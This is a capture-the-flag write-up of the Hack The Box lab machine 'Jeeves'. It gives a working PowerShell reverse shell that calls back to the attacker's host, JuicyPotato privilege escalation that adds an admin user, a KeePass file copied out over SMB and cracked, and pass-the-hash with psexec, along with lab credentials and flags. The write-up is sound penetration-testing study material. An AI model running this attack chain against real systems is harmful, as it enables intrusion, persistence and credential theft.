---
layout: single
title: Jeeves  - Hack The Box
excerpt: "Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path."
date: 2025-06-06
classes: wide
header:
  teaser: /img2/jeeves.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Jenkins Exploitation (Groovy Script Console)
  - JuicyPotato (SeImpersonatePrivilege)
  - PassTheHash (Psexec)
  - Breaking KeePass
  - Alternate Data Streams (ADS)
---


## Reconnaissance

- Nmap 

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.63
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 10:18 CEST
Nmap scan report for 10.10.10.63
Host is up (0.28s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 27.60 seconds
```

- Vulnerability and version scan

```bash
❯ nmap -sCV -p80,135,455,50000 10.10.10.63
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 10:19 CEST
Nmap scan report for 10.10.10.63
Host is up (0.087s latency).

PORT      STATE    SERVICE        VERSION
80/tcp    open     http           Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open     msrpc          Microsoft Windows RPC
455/tcp   filtered creativepartnr
50000/tcp open     http           Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
```

- Gobuster

```bash
❯ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```

## Exploitation

- Abusing Jenkins RCE

![](/img2/Pasted%20image%2020250606102929.png)

![](/img2/Pasted%20image%2020250606103030.png)

- Reverse Shell
![](/img2/Pasted%20image%2020250606104016.png)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.7",9000);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()
}
$client.Close()
```

```bash
❯ python3 -m http.server 80
```

```ruby
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.63 - - [06/Jun/2025 10:37:26] "GET /shell.ps1 HTTP/1.1" 200 -
```

```bash
❯ rlwrap nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.63] 49679
whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins> 
```

## Post-exploitation (OPTION 1)

- JuicyPotato (SeImpersonatePrivilege)

```bash
C:\Jenkins>JuicyPotato.exe -l 1337 -p cmd.exe -t * -a "/c net user test test123 /add"
```

```ruby
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

> First, create the new user

```bash
C:\Jenkins>JuicyPotato.exe -l 1337 -p cmd.exe -t * -a "/c net localgroup Administrators test /add"
```

```ruby
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

> We need to add new user to Administrators group and check the privileges.

```bash
❯ crackmapexec smb 10.10.10.63 -u 'test' -p 'test123'
```

```ruby
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\test:test123 
```

> We can check the privileges with crackmapexec, but the new user doesnt have admin privileges, so let's check in Windows.

```bash
C:\Jenkins>net user test
```

```ruby
User name                    test
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/6/2025 11:14:31 AM
Password expires             Never
Password changeable          6/6/2025 11:14:31 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

> The new user has already admin privileges, but we need to change reg policies to connect succesfully

```bash
C:\Jenkins>JuicyPotato.exe -l 1337 -p cmd.exe -t * -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

```ruby
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```bash
❯ crackmapexec smb 10.10.10.63 -u 'test' -p 'test123'
```

```ruby
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\test:test123 (Pwn3d!)                                                      
```

> Now we can connect with psexec

```bash
❯ impacket-psexec WORKGROUP/test@10.10.10.63 cmd.exe
```

```ruby
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file QkZnawxg.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service YNUq on 10.10.10.63.....
[*] Starting service YNUq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

- Get hidden flag in Alternate Data Stream (ADS) 

```bash
C:\Users\Administrator\Desktop> type hm.txt
```

```ruby
The flag is elsewhere.  Look deeper.
```

```bash
C:\Users\Administrator\Desktop> dir /r /s
```

```ruby
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes

     Total Files Listed:
               2 File(s)            833 bytes
               2 Dir(s)   2,644,865,024 bytes free
```

```bash
C:\Users\Administrator\Desktop> more < hm.txt:root.txt   
```

```ruby
afbc5bd4b615a60648cec41c6ac92530
```

## Post-exploitation (OPTION 2)

- Get kdbx file (KeePass)

```bash
C:\Users\kohsuke\Documents>dir
```

```ruby
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,644,860,928 bytes free
```

> We can see a kdbx file in C:\Users\kohsuke\Documents

```bash
C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.16.7\smbFolder\CEH.kdbx
```

```ruby
Overwrite \\10.10.16.7\smbFolder\CEH.kdbx? (Yes/No/All): Yes
Yes
        1 file(s) copied.

```

```bash
❯ impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

```ruby
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49998)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:6975af539bdfb4120f94d823168e77fe:0101000000000000006c33f9d0d6db0117da22f01f02d30200000000010010006e005800570042006b0065004e007300030010006e005800570042006b0065004e0073000200100048006c004e006f005200790072004e000400100048006c004e006f005200790072004e0007000800006c33f9d0d6db0106000400020000000800300030000000000000000000000000300000d2d4b1d2dabb9345a724c890ac83ca71283a38f012d97d2b55140639a57844e60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003700000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
```

- Cracking kdbx password with john

```bash
keepass2john CEH.kdbx > hash.txt
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```ruby
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:00:26 DONE (2025-06-06 12:55) 0.03841g/s 2112p/s 2112c/s 2112C/s nando1..monkeybum
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> The password is moonshine1, now we can open kdbx file

```bash
keepassxc CEH.kdbx
```

![](/img2/Pasted%20image%2020250606125808.png)

> We can check with crackmapexec if the hash is valid

```bash
❯ crackmapexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'
```

```ruby
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

> The hash is valid, so we can connect with psexec

- Pass The Hash

```bash
❯ impacket-psexec WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
```

```ruby
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file EYtNTaSf.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service hMkv on 10.10.10.63.....
[*] Starting service hMkv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

- Get hidden flag in Alternate Data Stream (ADS) 

```bash
C:\Users\Administrator\Desktop> type hm.txt
```

```ruby
The flag is elsewhere.  Look deeper.
```

```bash
C:\Users\Administrator\Desktop> dir /r /s
```

```ruby
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes

     Total Files Listed:
               2 File(s)            833 bytes
               2 Dir(s)   2,644,865,024 bytes free
```

```bash
C:\Users\Administrator\Desktop> more < hm.txt:root.txt   
```

```ruby
afbc5bd4b615a60648cec41c6ac92530
```


![](/img2/Pasted%20image%2020250606124506.png)